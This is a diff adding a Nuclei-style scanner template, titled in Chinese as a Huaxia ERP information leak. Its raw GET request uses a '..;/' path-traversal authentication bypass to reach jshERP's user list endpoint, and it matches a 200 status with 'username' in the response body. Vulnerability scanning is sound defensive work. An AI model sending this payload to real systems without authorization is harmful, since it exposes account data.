@@ -1,0 +1,25 @@
+id: huaxia-erp-info
+
+info:
+  name: 华夏ERP信息泄露
+  author: zyt
+  severity: high
+
+
+http:
+  - raw:
+      - |          
+        GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "username"
+      - type: status
+        status: 
+          - 200
+ 
